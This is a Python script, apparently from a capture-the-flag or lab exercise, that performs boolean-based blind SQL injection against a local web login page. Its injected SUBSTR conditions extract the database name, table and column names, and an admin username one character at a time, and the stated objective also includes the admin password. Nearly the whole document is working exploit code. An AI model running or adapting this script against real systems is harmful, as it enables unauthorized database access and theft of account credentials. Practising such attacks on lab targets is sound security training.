# Objective and context

Write a Python script to perform boolean-based blind SQL injection to extract:
1. Table names from the database
2. Column names from the users table
3. Actual username values where admin=1 or is_admin=1
4. The password for the admin user

Use substring/SUBSTR to extract data character by character. Since ORDER BY works up to 9 columns, we know the table structure.

```python
import requests
import string

target = "http://127.0.0.1:32895/index.php"

def test_condition(condition):
    """Test if a SQL condition is true by checking response"""
    payload = f"admin' AND {condition}-- -"
    params = {'username': payload, 'password': 'x'}
    resp = requests.get(target, params=params)
    # If condition is true, we get "not the admin" message
    # If false, we might get different response or error
    return "not the admin" in resp.text

print("Testing blind SQL injection...")

# First, let's try to extract the database name
print("\n[*] Extracting database name...")
db_name = ""
for pos in range(1, 20):
    found = False
    for char in string.ascii_lowercase + string.digits + '_':
        condition = f"SUBSTR(DATABASE(),{pos},1)='{char}'"
        if test_condition(condition):
            db_name += char
            print(f"Position {pos}: {char} -> {db_name}")
            found = True
            break
    if not found:
        break

print(f"\n[+] Database name: {db_name}")

# Extract table names
print("\n[*] Extracting table names from information_schema...")
# Test if we can query information_schema
if test_condition("(SELECT COUNT(*) FROM information_schema.tables)>0"):
    print("[+] Can query information_schema!")
    
    # Try to get table name
    table_name = ""
    for pos in range(1, 30):
        found = False
        for char in string.ascii_lowercase + string.digits + '_':
            condition = f"SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1),{pos},1)='{char}'"
            if test_condition(condition):
                table_name += char
                print(f"Table char {pos}: {char} -> {table_name}")
                found = True
                break
        if not found:
            break
    
    print(f"\n[+] Table name: {table_name}")

# Try extracting column names
print("\n[*] Trying to extract column names...")
col_name = ""
for pos in range(1, 30):
    found = False
    for char in string.ascii_lowercase + string.digits + '_':
        condition = f"SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() LIMIT 2,1),{pos},1)='{char}'"
        if test_condition(condition):
            col_name += char
            print(f"Column char {pos}: {char} -> {col_name}")
            found = True
            break
    if not found:
        break

print(f"\n[+] Column name: {col_name}")

# Try to extract usernames where there might be an admin flag
print("\n[*] Checking for admin users...")
# Try common admin field names
admin_fields = ['is_admin', 'admin', 'role', 'privilege', 'isadmin', 'is_root']
for field in admin_fields:
    condition = f"(SELECT COUNT(*) FROM users WHERE {field}=1)>0"
    if test_condition(condition):
        print(f"[+] Found admin field: {field}")
        # Extract username with this field
        username = ""
        for pos in range(1, 30):
            found = False
            for char in string.ascii_lowercase + string.digits + '_':
                condition = f"SUBSTR((SELECT username FROM users WHERE {field}=1 LIMIT 1),{pos},1)='{char}'"
                if test_condition(condition):
                    username += char
                    print(f"Admin user char {pos}: {char} -> {username}")
                    found = True
                    break
            if not found:
                break
        print(f"\n[+++] ADMIN USERNAME: {username}")
        break

print("\n[*] Script complete")
```


